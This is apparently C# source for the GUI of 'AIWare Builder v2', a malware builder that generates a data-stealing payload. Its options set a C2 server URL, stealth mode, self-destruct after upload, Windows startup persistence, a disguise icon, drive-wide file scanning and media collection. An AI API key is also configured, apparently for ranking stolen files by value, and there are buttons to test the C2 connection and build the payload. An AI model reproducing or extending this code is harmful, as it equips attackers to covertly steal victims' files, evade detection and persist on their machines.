using System;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;

namespace AIWareBuilder
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            InitializeMyCustomComponents();
        }

        private void InitializeMyCustomComponents()
        {
            // Window settings
            this.Text = "AIWare Builder v2";
            this.Width = 480;
            this.Height = 710;
            this.FormBorderStyle = FormBorderStyle.FixedSingle;
            this.MaximizeBox = false;
            this.BackColor = Color.FromArgb(30, 30, 30);

            Font labelFont = new Font("Segoe UI", 10, FontStyle.Regular);
            Font inputFont = new Font("Segoe UI", 10, FontStyle.Regular);

            Color labelColor = Color.WhiteSmoke;
            Color inputBgColor = Color.FromArgb(50, 50, 50);
            Color inputTextColor = Color.White;

            // --- Server URL ---
            Label lblUrl = new Label() { Text = "Server URL:", Left = 10, Top = 20, Width = 140, ForeColor = labelColor, Font = labelFont };
            TextBox txtUrl = new TextBox()
            {
                Name = "txtUrl",
                Left = 160,
                Top = 20,
                Width = 280,
                Font = inputFont,
                BackColor = inputBgColor,
                ForeColor = inputTextColor,
                Text = "http://127.0.0.1:8000/analyze"
            };

            // --- Sample Size ---
            Label lblSampleSize = new Label() { Text = "Sample Size (KB):", Left = 10, Top = 70, Width = 140, ForeColor = labelColor, Font = labelFont };
            NumericUpDown numSampleSize = new NumericUpDown()
            {
                Name = "numSampleSize",
                Left = 160,
                Top = 70,
                Width = 100,
                Minimum = 1,
                Maximum = 100,
                Value = 5,
                Font = inputFont,
                BackColor = inputBgColor,
                ForeColor = inputTextColor
            };

            // --- Value Threshold ---
            Label lblThreshold = new Label() { Text = "Value Threshold (%):", Left = 10, Top = 120, Width = 160, ForeColor = labelColor, Font = labelFont };
            NumericUpDown numThreshold = new NumericUpDown()
            {
                Name = "numThreshold",
                Left = 180,
                Top = 120,
                Width = 100,
                Minimum = 0,
                Maximum = 100,
                Value = 70,
                Font = inputFont,
                BackColor = inputBgColor,
                ForeColor = inputTextColor
            };

            // --- AI Model Selection ---
            Label lblAiModel = new Label() { Text = "AI Model:", Left = 10, Top = 170, Width = 140, ForeColor = labelColor, Font = labelFont };
            ComboBox comboAiModel = new ComboBox()
            {
                Name = "comboAiModel",
                Left = 160,
                Top = 170,
                Width = 280,
                Font = inputFont,
                BackColor = inputBgColor,
                ForeColor = inputTextColor,
                DropDownStyle = ComboBoxStyle.DropDownList
            };
            comboAiModel.Items.Add("OpenAI (GPT-4o)");
            comboAiModel.Items.Add("Anthropic (Claude-3-Opus)");
            comboAiModel.Items.Add("DeepSeek (deepseek-chat)");
            comboAiModel.Items.Add("Custom API");
            comboAiModel.SelectedIndex = 0;
            comboAiModel.SelectedIndexChanged += new EventHandler(ComboAiModel_SelectedIndexChanged);

            // --- AI API URL ---
            Label lblApiUrl = new Label() { Name = "lblApiUrl", Text = "AI API URL:", Left = 10, Top = 210, Width = 140, ForeColor = labelColor, Font = labelFont, Visible = false };
            TextBox txtApiUrl = new TextBox()
            {
                Name = "txtApiUrl",
                Left = 160,
                Top = 210,
                Width = 280,
                Font = inputFont,
                BackColor = inputBgColor,
                ForeColor = inputTextColor,
                Text = "https://api.openai.com/v1/chat/completions",
                Visible = false
            };

            // --- AI API Key ---
            Label lblApiKey = new Label() { Text = "AI API Key:", Left = 10, Top = 250, Width = 140, ForeColor = labelColor, Font = labelFont };
            TextBox txtApiKey = new TextBox()
            {
                Name = "txtApiKey",
                Left = 160,
                Top = 250,
                Width = 280,
                Font = inputFont,
                BackColor = inputBgColor,
                ForeColor = inputTextColor,
                UseSystemPasswordChar = true, // Hide API Key input
                Text = ""
            };

            // --- Skip AI Check Checkbox ---
            CheckBox chkSkipAi = new CheckBox()
            {
                Name = "chkSkipAi",
                Text = "Skip AI Check (Pure Speed Mode)",
                Left = 10,
                Top = 290,
                Width = 300,
                ForeColor = labelColor,
                Font = labelFont
            };
            chkSkipAi.CheckedChanged += new EventHandler(ChkSkipAi_CheckedChanged);

            // --- Stealth Checkbox ---
            CheckBox chkStealth = new CheckBox()
            {
                Name = "chkStealth",
                Text = "Enable Stealth Mode",
                Left = 10,
                Top = 320,
                Width = 250,
                ForeColor = labelColor,
                Font = labelFont
            };

            // --- Self-Destruct Checkbox ---
            CheckBox chkSelfDestruct = new CheckBox()
            {
                Name = "chkSelfDestruct",
                Text = "Auto Self-Destruct After Upload",
                Left = 10,
                Top = 350,
                Width = 300,
                ForeColor = labelColor,
                Font = labelFont
            };

            // --- Persistence Checkbox ---
            CheckBox chkPersistence = new CheckBox()
            {
                Name = "chkPersistence",
                Text = "Enable Persistence (Run at Windows Startup)",
                Left = 10,
                Top = 380,
                Width = 350,
                ForeColor = labelColor,
                Font = labelFont
            };

            // --- Icon Selection ---
            Label lblIcon = new Label() { Text = "Custom Icon:", Left = 10, Top = 410, Width = 140, ForeColor = labelColor, Font = labelFont };
            Label lblIconPath = new Label() 
            { 
                Name = "lblIconPath",
                Text = "No icon selected (will use default)",
                Left = 160,
                Top = 410,
                Width = 200,
                ForeColor = Color.Gray,
                Font = new Font("Segoe UI", 8, FontStyle.Italic)
            };
            Button btnSelectIcon = new Button()
            {
                Name = "btnSelectIcon",
                Text = "Browse...",
                Left = 370,
                Top = 408,
                Width = 70,
                Height = 25,
                Font = inputFont,
                BackColor = inputBgColor,
                ForeColor = inputTextColor
            };
            btnSelectIcon.Click += new EventHandler(BtnSelectIcon_Click);

            // --- Scan Mode Selection ---
            Label lblScanMode = new Label() { Text = "Scan Locations:", Left = 10, Top = 440, Width = 140, ForeColor = labelColor, Font = labelFont };
            ComboBox comboScanMode = new ComboBox()
            {
                Name = "comboScanMode",
                Left = 160,
                Top = 440,
                Width = 280,
                Font = inputFont,
                BackColor = inputBgColor,
                ForeColor = inputTextColor,
                DropDownStyle = ComboBoxStyle.DropDownList
            };
            comboScanMode.Items.Add("Default Locations (User folders + Removable drives)");
            comboScanMode.Items.Add("Full System Scan (All drives, slower)");
            comboScanMode.SelectedIndex = 0;

            // --- Media Files Checkbox ---
            CheckBox chkMediaFiles = new CheckBox()
            {
                Name = "chkMediaFiles",
                Text = "Collect Media Files (Images, Videos)",
                Left = 10,
                Top = 480,
                Width = 300,
                ForeColor = labelColor,
                Font = labelFont
            };

            // --- Test AI API Connection Button ---
            Button btnTestAi = new Button()
            {
                Name = "btnTestAi",
                Text = "🧠 Test AI API",
                Left = 40,
                Top = 520,
                Width = 180,
                Height = 30,
                Font = new Font("Segoe UI", 10, FontStyle.Bold),
                BackColor = Color.FromArgb(70, 150, 120), // Green-blue
                ForeColor = Color.White
            };
            
            btnTestAi.Click += new EventHandler(BtnTestAi_Click);

            // --- Test C2 Connection Button ---
            Button btnTestC2 = new Button()
            {
                Name = "btnTestC2",
                Text = "🔌 Test C2 Connection",
                Left = 250,
                Top = 520,
                Width = 180,
                Height = 30,
                Font = new Font("Segoe UI", 10, FontStyle.Bold),
                BackColor = Color.FromArgb(60, 120, 170), // Slightly darker SteelBlue
                ForeColor = Color.White
            };
            
            btnTestC2.Click += new EventHandler(BtnTestC2_Click);

            // --- Build Button ---
            Button btnBuild = new Button()
            {
                Text = "🚀 Build Payload",
                Left = 145,
                Top = 570,
                Width = 180,
                Height = 40,
                Font = new Font("Segoe UI", 10, FontStyle.Bold),
                BackColor = Color.FromArgb(70, 130, 180), // SteelBlue
                ForeColor = Color.White
            };
            
            btnBuild.Click += new EventHandler(BtnBuild_Click);

            // --- Footer Label ---
            LinkLabel lblFooter = new LinkLabel()
            {
                Text = "© 2025 SecInformer Labs – Dev By: Salim Jay.",
                Left = 60,
                Top = 650,
                Width = 400,
                Font = new Font("Segoe UI", 10, FontStyle.Bold),
                LinkColor = Color.FromArgb(100, 180, 230),
                ActiveLinkColor = Color.FromArgb(130, 210, 255),
                VisitedLinkColor = Color.FromArgb(100, 180, 230)
            };
            lblFooter.Click += new EventHandler(LblFooter_Click);

            // Add Controls
            this.Controls.Add(lblUrl);
            this.Controls.Add(txtUrl);
            this.Controls.Add(lblSampleSize);
            this.Controls.Add(numSampleSize);
            this.Controls.Add(lblThreshold);
            this.Controls.Add(numThreshold);
            this.Controls.Add(lblAiModel);
            this.Controls.Add(comboAiModel);
            this.Controls.Add(lblApiUrl);
            this.Controls.Add(txtApiUrl);
            this.Controls.Add(lblApiKey);
            this.Controls.Add(txtApiKey);
            this.Controls.Add(chkSkipAi);
            this.Controls.Add(chkStealth);
            this.Controls.Add(chkSelfDestruct);
            this.Controls.Add(chkPersistence);
            this.Controls.Add(lblIcon);
            this.Controls.Add(lblIconPath);
            this.Controls.Add(btnSelectIcon);
            this.Controls.Add(lblScanMode);
            this.Controls.Add(comboScanMode);
            this.Controls.Add(chkMediaFiles);
            this.Controls.Add(btnTestAi);
            this.Controls.Add(btnTestC2);
            this.Controls.Add(btnBuild);
            this.Controls.Add(lblFooter);
            
            ComboAiModel_SelectedIndexChanged(comboAiModel, EventArgs.Empty);
        }

        private void BtnSelectIcon_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Title = "Select Icon File";
                openFileDialog.Filter = "Icon Files (*.ico)|*.ico|All Files (*.*)|*.*";
                openFileDialog.FilterIndex = 1;
                
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    string selectedPath = openFileDialog.FileName;
                    Label lblIconPath = (Label)this.Controls["lblIconPath"];
                    lblIconPath.Text = Path.GetFileName(selectedPath);
                    lblIconPath.ForeColor = Color.White;
                    lblIconPath.Tag = selectedPath;
                }
            }
        }

        private async void BtnTestAi_Click(object sender, EventArgs e)
        {
            // Get AI API settings
            string aiApiUrl = ((TextBox)this.Controls["txtApiUrl"]).Text;
            string aiApiKey = ((TextBox)this.Controls["txtApiKey"]).Text;
            ComboBox comboAiModel = (ComboBox)this.Controls["comboAiModel"];
            
            // Check if Skip AI is checked
            CheckBox chkSkipAi = (CheckBox)this.Controls["chkSkipAi"];
            if (chkSkipAi.Checked)
            {
                MessageBox.Show("AI check is currently disabled (Skip AI Check is enabled).\nEnable AI to test the connection.", "AI Test", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }
            
            // Validate inputs
            if (string.IsNullOrEmpty(aiApiUrl))
            {
                MessageBox.Show("Please enter an AI API URL.", "AI Test", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }
            
            if (string.IsNullOrEmpty(aiApiKey))
            {
                MessageBox.Show("Please enter an AI API Key.", "AI Test", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }
            
            // Disable the button during the test
            Button btnTestAi = (Button)sender;
            btnTestAi.Enabled = false;
            btnTestAi.Text = "Testing...";
            
            try
            {
                using (var client = new System.Net.Http.HttpClient())
                {
                    // Set a timeout of 10 seconds
                    client.Timeout = TimeSpan.FromSeconds(10);
                    
                    // Add API key to headers
                    client.DefaultRequestHeaders.Add("Authorization", $"Bearer {aiApiKey}");
                    
                    // Prepare a simple test request based on the API type
                    string requestBody = "";
                    string modelName = "";
                    
                    switch (comboAiModel.SelectedIndex)
                    {
                        case 0: // OpenAI (GPT-4o)
                            modelName = "gpt-4o";
                            requestBody = $@"{{
                                ""model"": ""{modelName}"",
                                ""messages"": [
                                    {{
                                        ""role"": ""system"",
                                        ""content"": ""You are a helpful assistant.""
                                    }},
                                    {{
                                        ""role"": ""user"",
                                        ""content"": ""Say 'Connection successful' if you can read this.""
                                    }}
                                ],
                                ""max_tokens"": 10
                            }}";
                            break;
                        case 1: // Anthropic (Claude-3-Opus)
                            modelName = "claude-3-opus";
                            requestBody = $@"{{
                                ""model"": ""{modelName}"",
                                ""messages"": [
                                    {{
                                        ""role"": ""user"",
                                        ""content"": ""Say 'Connection successful' if you can read this.""
                                    }}
                                ],
                                ""max_tokens"": 10
                            }}";
                            break;
                        case 2: // DeepSeek (deepseek-chat)
                            modelName = "deepseek-chat";
                            requestBody = $@"{{
                                ""model"": ""{modelName}"",
                                ""messages"": [
                                    {{
                                        ""role"": ""system"",
                                        ""content"": ""You are a helpful assistant.""
                                    }},
                                    {{
                                        ""role"": ""user"",
                                        ""content"": ""Say 'Connection successful' if you can read this.""
                                    }}
                                ],
                                ""stream"": false,
                                ""max_tokens"": 10
                            }}";
                            break;
                        case 3: // Custom API
                            modelName = "custom-model";
                            requestBody = $@"{{
                                ""model"": ""your-model-name"",
                                ""messages"": [
                                    {{
                                        ""role"": ""user"",
                                        ""content"": ""Say 'Connection successful' if you can read this.""
                                    }}
                                ],
                                ""max_tokens"": 10
                            }}";
                            break;
                    }
                    
                    // Create the request content
                    var content = new System.Net.Http.StringContent(
                        requestBody, 
                        Encoding.UTF8, 
                        "application/json");
                    
                    // Send the request
                    var response = await client.PostAsync(aiApiUrl, content);
                    
                    // Check if the request was successful
                    if (response.IsSuccessStatusCode)
                    {
                        string responseBody = await response.Content.ReadAsStringAsync();
                        MessageBox.Show($"✅ AI API connection successful!\n\nResponse received from {modelName}.", "AI Test", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                    else
                    {
                        MessageBox.Show($"⚠️ AI API responded with status code: {response.StatusCode}\n\nResponse: {await response.Content.ReadAsStringAsync()}", "AI Test", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"❌ AI API connection failed!\n\nError: {ex.Message}", "AI Test", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            finally
            {
                // Re-enable the button and restore its text
                btnTestAi.Enabled = true;
                btnTestAi.Text = "🧠 Test AI API";
            }
        }

        private async void BtnTestC2_Click(object sender, EventArgs e)
        {
            string serverUrl = ((TextBox)this.Controls["txtUrl"]).Text;
            
            // Disable the button during the test
            Button btnTestC2 = (Button)sender;
            btnTestC2.Enabled = false;
            btnTestC2.Text = "Testing...";
            
            try
            {
                using (var client = new System.Net.Http.HttpClient())
                {
                    // Set a timeout of 5 seconds
                    client.Timeout = TimeSpan.FromSeconds(5);
                    
                    // Create an empty POST request
                    var content = new System.Net.Http.StringContent(string.Empty);
                    
                    // Send the request
                    var response = await client.PostAsync(serverUrl, content);
                    
                    // Check if the request was successful
                    if (response.IsSuccessStatusCode)
                    {
                        MessageBox.Show("✅ C2 Server is reachable!", "Connection Test", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                    else
                    {
                        MessageBox.Show($"⚠️ C2 Server responded with status code: {response.StatusCode}", "Connection Test", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"❌ C2 Server is unreachable!\n\nError: {ex.Message}", "Connection Test", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            finally
            {
                // Re-enable the button and restore its text
                btnTestC2.Enabled = true;
                btnTestC2.Text = "🔌 Test C2 Connection";
            }
        }

        private void ComboAiModel_SelectedIndexChanged(object sender, EventArgs e)
        {
            try
            {
                ComboBox comboAiModel = (ComboBox)sender;
                
                // Check if the controls exist before accessing them
                if (!this.Controls.ContainsKey("txtApiUrl") || !this.Controls.ContainsKey("lblApiUrl"))
                    return;
                
                TextBox txtApiUrl = (TextBox)this.Controls["txtApiUrl"];
                Label lblApiUrl = (Label)this.Controls["lblApiUrl"];
                
                if (txtApiUrl == null || lblApiUrl == null)
                    return;
                
                // Show/hide API URL field based on selection
                bool isCustomApi = comboAiModel.SelectedIndex == 3;
                

                txtApiUrl.Visible = isCustomApi;
                lblApiUrl.Visible = isCustomApi;
                
                // Update API URL based on selected model
                switch (comboAiModel.SelectedIndex)
                {
                    case 0: // OpenAI (GPT-4o)
                        txtApiUrl.Text = "https://api.openai.com/v1/chat/completions";
                        break;
                    case 1: // Anthropic (Claude-3-Opus)
                        txtApiUrl.Text = "https://api.anthropic.com/v1/messages";
                        break;
                    case 2: // DeepSeek (deepseek-chat)
                        txtApiUrl.Text = "https://api.deepseek.com/v1/chat/completions";
                        break;
                    case 3: // Custom API
                        txtApiUrl.Text = "https://your-custom-ai-api.com/v1/chat/completions";
                        break;
                }
            }
            catch (Exception ex)
            {
                // Silently handle any exceptions during initialization
                Console.WriteLine($"Error in ComboAiModel_SelectedIndexChanged: {ex.Message}");
            }
        }
        
        private void ChkSkipAi_CheckedChanged(object sender, EventArgs e)
        {
            try
            {
                CheckBox chkSkipAi = (CheckBox)sender;
                
                // Check if the controls exist before accessing them
                if (!this.Controls.ContainsKey("txtApiUrl") || !this.Controls.ContainsKey("txtApiKey") || !this.Controls.ContainsKey("comboAiModel"))
                    return;
                
                TextBox txtApiUrl = (TextBox)this.Controls["txtApiUrl"];
                TextBox txtApiKey = (TextBox)this.Controls["txtApiKey"];
                ComboBox comboAiModel = (ComboBox)this.Controls["comboAiModel"];
                
                if (txtApiUrl == null || txtApiKey == null || comboAiModel == null)
                    return;
                
                // Enable/disable AI API controls based on Skip AI checkbox
                bool enableControls = !chkSkipAi.Checked;
                txtApiUrl.Enabled = enableControls;
                txtApiKey.Enabled = enableControls;
                comboAiModel.Enabled = enableControls;
                
                // Clear API URL if Skip AI is checked (to trigger the skip in the code)
                if (chkSkipAi.Checked)
                {
                    txtApiUrl.Text = "";
                }
                else
                {
                    // Restore default URL based on selected model
                    ComboAiModel_SelectedIndexChanged(comboAiModel, EventArgs.Empty);
                }
            }
            catch (Exception ex)
            {
                // Silently handle any exceptions during initialization
                Console.WriteLine($"Error in ChkSkipAi_CheckedChanged: {ex.Message}");
            }
        }

        private void LblFooter_Click(object sender, EventArgs e)
        {
            try
            {
                string url = "https://www.linkedin.com/in/slim-jay/";
                
                // Use ProcessStartInfo with UseShellExecute for better compatibility
                System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo
                {
                    FileName = url,
                    UseShellExecute = true
                };
                System.Diagnostics.Process.Start(psi);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Could not open URL: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void BtnBuild_Click(object sender, EventArgs e)
        {
            // Grab user inputs
            string serverUrl = ((TextBox)this.Controls["txtUrl"]).Text;
            int sampleSize = (int)((NumericUpDown)this.Controls["numSampleSize"]).Value;
            int threshold = (int)((NumericUpDown)this.Controls["numThreshold"]).Value;
            string aiApiUrl = ((TextBox)this.Controls["txtApiUrl"]).Text;
            string aiApiKey = ((TextBox)this.Controls["txtApiKey"]).Text;
            bool stealthEnabled = ((CheckBox)this.Controls["chkStealth"]).Checked;
            bool selfDestructEnabled = ((CheckBox)this.Controls["chkSelfDestruct"]).Checked;
            
            // Get icon path if selected
            string iconPath = null;
            Label lblIconPath = (Label)this.Controls["lblIconPath"];
            if (lblIconPath.Tag != null)
            {
                iconPath = lblIconPath.Tag.ToString();
            }
            
            // Get scan mode, media files, and persistence options
            string scanMode = ((ComboBox)this.Controls["comboScanMode"]).SelectedIndex == 0 ? "Default" : "Full";
            bool collectMediaFiles = ((CheckBox)this.Controls["chkMediaFiles"]).Checked;
            bool persistenceEnabled = ((CheckBox)this.Controls["chkPersistence"]).Checked;

            // Create settings object
            var settings = new SettingsManager.StubSettings
            {
                ServerUrl = serverUrl,
                SampleSizeKB = sampleSize,
                ValueThreshold = threshold,
                StealthEnabled = stealthEnabled,
                SelfDestructEnabled = selfDestructEnabled,
                AiApiUrl = aiApiUrl,
                AiApiKey = aiApiKey,
                IconPath = iconPath,
                ScanMode = scanMode,
                CollectMediaFiles = collectMediaFiles,
                PersistenceEnabled = persistenceEnabled
            };

            // Output folder
            string outputFolder = Path.Combine(Directory.GetCurrentDirectory(), "Payloads");
            Directory.CreateDirectory(outputFolder);

            // Build
            bool result = BuilderEngine.BuildPayload(settings, outputFolder);

            if (result)
            {
                MessageBox.Show($"✅ Payload built successfully!\nSaved in {outputFolder}", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else
            {
                MessageBox.Show($"❌ Build failed! Check console logs.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }


    }
}
